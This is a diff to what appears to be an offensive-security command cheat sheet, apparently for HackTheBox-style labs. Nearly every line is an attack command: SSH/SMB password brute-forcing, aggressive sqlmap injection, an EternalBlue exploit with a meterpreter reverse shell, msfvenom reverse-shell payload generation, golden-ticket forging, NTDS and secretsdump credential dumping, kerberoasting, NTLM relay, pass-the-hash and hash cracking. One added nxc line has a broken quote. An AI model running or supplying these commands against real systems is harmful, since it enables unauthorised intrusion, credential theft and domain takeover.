@@ -2,33 +2,44 @@ sudo nmap -T5 -Pn --top-ports 20 --open 192.168.239.0/24
 impacket-ticketer -nthash 0f5assasa6f -domain-sid S-1–5–21–2986980474–46765180–2505414123 -domain 'domain.local' Administrator
 impacket-raiseChild -target-exec 172.16.5.5 "child.domain.local/administrator:password123"
 onesixtyone $(IP) -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt
-gobuster dir -u http://$(IP)/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster_dir_$(IP).txt
+gobuster dir -u http://$(IP)/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -o gobuster_dir_$(IP).txt
 gobuster dns -d $(IP) -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -o gobuster_dns_$(IP).txt
-ffuf -u http://$(IP)/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 50 -o ffuf_$(IP).json
-feroxbuster -u http://$(IP)/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o ferox_$(IP).txt
-hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://$(IP) -t 4
-hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt smb://$(IP) -t 4
-medusa -h $(IP) -U /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt -M ssh
+gobuster vhost -u http://inlanefreight.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain
+ffuf -u http://$(IP)/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -o ffuf_$(IP).json
+feroxbuster -u http://$(IP)/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -o ferox_$(IP).txt
+hydra -L /opt/wordlists/xato-net-10-million-usernames.txt -P /opt/wordlists/rockyou.txt ssh://$(IP) -t 4
+hydra -L /opt/wordlists/xato-net-10-million-usernames.txt -P /opt/wordlists/rockyou.txt smb://$(IP) -t 4
+medusa -h $(IP) -U /opt/wordlists/xato-net-10-million-usernames.txt -P /opt/wordlists/rockyou.txt -M ssh
 nikto -h http://$(IP) -output nikto_$(IP).txt
 whatweb http://$(IP)
 httpx -u http://$(IP) -silent -status-code -title -content-length
 sqlmap -u "http://$(IP)/vuln.php?id=1" --batch --dbs
+sqlmap -u "http://$(IP)/vuln.php?id=1" --batch --level=5 --risk=3 --threads=10 --time-sec=2  --text-only --exclude-sysdbs --dbs --tables
 wpscan --url http://$(IP) --enumerate u --api-token YOUR_WPSCAN_API_TOKEN
+wpscan --url http://www.smol.htb --enumerate ap,at,cb,u,tt,dbe,m --plugins-detection mixed --api-token YOUR_WPSCAN_API_TOKEN --disable-tls-checks --force
 msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $(IP); set LHOST $(IP); set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LPORT 4444; exploit"
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(IP) LPORT=4444 -f exe -o shell.exe
 impacket-smbclient \\$(IP)\IPC$ -username 'User' -password 'Pass'
-impacket-secretsdump -hashes LM:NT 'DOMAIN/Administrator:Password'@$(IP)
+impacket-secretsdump -hashes :NT 'DOMAIN/Administrator:Password'@$(IP)
 impacket-psexec 'Administrator:Password'@$(IP) cmd.exe
 impacket-mssqlclient -windows-auth 'DOMAIN\Administrator:Password' -port 1433 $(IP)
 sudo impacket-ntlmrelayx -smb2support -t ldap://$(IP)
 sudo impacket-smbserver share_name /tmp/share -smb2support
+nxc smb `IP` -u guest -p '' --users
+nxc smb `IP` -u 'guest -p '' --rid-brute 10000
+nxc ldap dc01.inlanefreight.local -u guest -p '' -d inlanefreight.local --bloodhound --collection ALL --dns-server `IP`
+nxc smb `IP` --shares -u guest -p '' --spider share --content --regex 'passw'
+nxc smb `IP` -u guest -p '' --ntds  --user krbtgt
+nxc ldap `IP` -u guest -p '' --kerberoasting tickets.txt
 sudo responder -I eth0 -rv
 smbclient -L //$(IP) -U 'username%password'
+smbclient -L //$(IP) -U 'username' -p 'password'
+smbclient \\\\`IP`\\share -U Administrator --pw-nt-hash 0000000000000000000000
 smbmap -H $(IP) -u 'username' -p 'password'
 evil-winrm -i $(IP) -u 'Administrator' -p 'Password'
 enum4linux -a $(IP)
 smbget smb://$(IP)/share/flag.txt -u username -p password
-hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --status --status-timer=10
+hashcat -m 1000 -a 0 hashes.txt /opt/wordlists/rockyou.txt --status --status-timer=10
 john --wordlist=/opt/wordlists/rockyou.txt --rules=rockyou-30000 hash.txt
 hashid '5f4dcc3b5aa765d61d8327deb882cf99'
 hydra-wizard
@@ -45,3 +56,4 @@ snmpwalk -v2c -c openview $(IP)
 steghide extract -p 3xtr4ctd4t4 -sf trytofind.jpg -xf data.txt
 stegsnow -C fileer.txt
 stegseek stegofile.jpg wordlist.txt
+
